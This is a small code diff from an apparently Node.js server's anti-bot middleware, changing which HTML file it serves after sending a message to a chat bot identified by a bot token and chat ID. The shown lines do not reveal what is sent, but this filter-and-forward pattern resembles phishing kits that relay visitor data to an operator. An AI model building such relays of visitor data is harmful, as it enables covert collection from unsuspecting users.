@@ -273,7 +273,7 @@ async function antiBotMiddleware(req, res, next) {
     
             const sendMessage = sendMessageFor(botToken, chatId); 
             sendMessage(message);
-            const htmlContent = await fs.readFile('index2.html', 'utf-8');
+            const htmlContent = await fs.readFile('index.html', 'utf-8');
 
             // Send the HTML content as a response
             res.send(htmlContent);
